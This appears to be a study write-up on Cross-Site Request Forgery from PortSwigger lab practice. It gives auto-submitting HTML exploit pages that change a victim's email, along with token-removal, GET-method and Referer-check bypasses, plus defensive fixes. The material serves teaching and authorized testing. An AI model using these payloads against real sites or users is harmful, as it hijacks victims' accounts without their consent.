## 1. What is CSRF?

**CSRF** stands for **Cross-Site Request Forgery**.

It is a vulnerability that allows an attacker to make a victim's browser send an unwanted request to a website where the victim is already logged in.

The attacker does **not** need the victim's password.  
The attack works because the browser automatically sends the victim's cookies with the request.

---

## 2. Simple Idea

A vulnerable website has an endpoint that changes the user's email:

```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-site.com
Cookie: session=VICTIM_SESSION

email=attacker@gmail.com
```

If the website does not require a valid CSRF token, an attacker can create an external page that sends the same request automatically.

---

## 3. Basic CSRF PoC

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Explanation

| Part | Meaning |
|---|---|
| `form action` | The vulnerable endpoint |
| `method="POST"` | Sends the request using POST |
| `input type="hidden"` | Sends the email value silently |
| `document.forms[0].submit()` | Automatically submits the form |

---

## 4. Why CSRF Works

CSRF works when:

- The user is authenticated.
- The browser sends cookies automatically.
- The target action changes something important.
- The server does not verify that the request came from a trusted page.
- There is no CSRF token, or the CSRF protection is weak.

---

## 5. CSRF Token

A **CSRF token** is a random secret value generated by the server and added to forms or requests.

Example:

```html
<input type="hidden" name="csrf" value="RANDOM_SECRET_TOKEN">
```

When the user submits the form, the server checks whether the token is valid.

A strong CSRF token should be:

- Random
- Unpredictable
- Tied to the user's session
- Verified on the server side
- Required for all state-changing requests

---

## 6. Common CSRF Token Bypass Cases

### 6.1 Removing the Anti-CSRF Token

Sometimes the server checks the token only if it exists.  
If removing the token still allows the request, the protection is broken.

```http
POST /change-email

email=attacker@gmail.com
```

---

### 6.2 Token Not Bound to the User

A weak implementation may accept a valid token from another user.

```text
Token from user A works with user B's session.
```

The token must be linked to the current authenticated session.

---

### 6.3 Weak or Guessable Token

Bad examples:

```text
csrf=123
csrf=user_id
csrf=admin
csrf=md5(username)
```

A CSRF token should not be predictable.

---

### 6.4 Reusable Tokens

If the same token can be reused many times, the protection may be weaker.

Better behavior:

- Token changes after sensitive actions.
- Token expires after a period of time.
- Token is bound to the session.

---

### 6.5 Changing the Request Method

Some applications validate the CSRF token only for `POST`, but allow the same action using `GET`.

```http
GET /my-account/change-email?email=attacker@gmail.com
```

If this works while the POST request requires a token, the protection is bypassed.

---

### 6.6 Bypassing Referer Checks

Some websites rely on the `Referer` header instead of using a CSRF token.

This can be weak if the application only checks whether the domain appears somewhere in the `Referer`.

Example lab bypass:

```html
<script>
  history.pushState("", "", "/?LAB-ID.web-security-academy.net");
  document.forms[0].submit();
</script>
```

To force the browser to send the full URL in the Referer header, use this in the Exploit Server **Head** section:

```http
Referrer-Policy: unsafe-url
```

## 8. Lab: CSRF Where Token Validation Depends on Request Method

### Idea

The application may require a CSRF token for `POST`, but it may accept the same action using `GET`.

### POST Request

```http
POST /my-account/change-email
```

### Bypass Request

```http
GET /my-account/change-email?email=attacker@gmail.com
```

### PoC

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@gmail.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Key Lesson

If the server validates CSRF only for one HTTP method, attackers may bypass the protection by changing the request method.

## 9. Lab: CSRF With Broken Referer Validation

### Idea

The application checks the `Referer` header, but the check is weak.

The bypass is to make the lab domain appear in the Referer URL, even though the request is sent from the exploit server.

### Required Header

In the Exploit Server **Head** section:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

### PoC

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
    </form>

    <script>
      history.pushState("", "", "/?LAB-ID.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Important Notes

- `Referrer-Policy: unsafe-url` makes the browser send the full URL in the Referer header.
- `history.pushState()` changes the visible path of the exploit page.
- The lab domain is added to the exploit page URL so the weak Referer check passes.

## 10. Local Testing With `test` Host

The instructor used a local host name called:

```text
test
```

This is not a real website. It is a local alias pointing to `127.0.0.1`.

### Configure `/etc/hosts`

Open the file:

```bash
sudo nano /etc/hosts
```

Add:

```text
127.0.0.1 test
```

Save:

```text
Ctrl + O
Enter
Ctrl + X
```

### Run a Local Server

If `exploit.html` is in the current directory:

```bash
sudo python3 -m http.server 80
```

Then open:

```text
http://test/exploit.html
```

Or use port `8000`:

```bash
python3 -m http.server 8000
```

Then open:

```text
http://test:8000/exploit.html
```

## 11. Common Mistakes

| Mistake | Fix |
|---|---|
| `Unknown host: test` | Add `127.0.0.1 test` to `/etc/hosts` |
| `Unknown host: http` | Use `http://test`, not `http//test` |
| `cd exploit.html` | `exploit.html` is a file, not a directory |
| Server exits | Do not press `Ctrl + C` while testing |
| File not found | Run the server in the same directory as `exploit.html` |
| Request method wrong | Add `method="POST"` or `method="GET"` correctly |
| Exploit works locally but not in lab | Use PortSwigger Exploit Server for the victim |

## 12. Testing Checklist

When testing CSRF in a legal lab or authorized environment:

- [ ] Identify a sensitive action.
- [ ] Capture the request in Burp Suite.
- [ ] Check whether there is a CSRF token.
- [ ] Check whether the token is tied to the user session.
- [ ] Try removing the token.
- [ ] Try changing the request method.
- [ ] Check whether the application relies only on `Referer`.
- [ ] Build a safe PoC.
- [ ] Test only on your own authorized account.
- [ ] Document the request, impact, and fix.

---

## 13. Impact

A CSRF vulnerability may allow an attacker to perform actions as the victim, such as:

- Changing the victim's email address
- Changing account settings
- Submitting forms
- Linking the victim's account to attacker-controlled data
- Performing state-changing actions without consent

The impact depends on what the vulnerable endpoint does.

---

## 14. Recommended Fix

The application should:

- Use strong CSRF tokens.
- Bind CSRF tokens to the user's session.
- Validate tokens on the server side.
- Require tokens for all state-changing requests.
- Avoid sensitive actions using `GET`.
- Use `SameSite` cookies.
- Validate `Origin` and `Referer` as defense-in-depth.
- Re-authenticate users for critical actions.

Example secure requirements:

```text
Valid session + valid CSRF token + correct HTTP method + server-side authorization
```

---

## 15. Key Lessons Learned

- CSRF abuses the browser's automatic cookie behavior.
- A CSRF token must be verified by the server.
- Token presence alone does not guarantee security.
- Changing request method may bypass weak CSRF validation.
- Referer checks alone are not enough.
- The exploit must be tested safely in authorized labs only.
- In real work, never send CSRF exploits to real users. Test with approved accounts only.
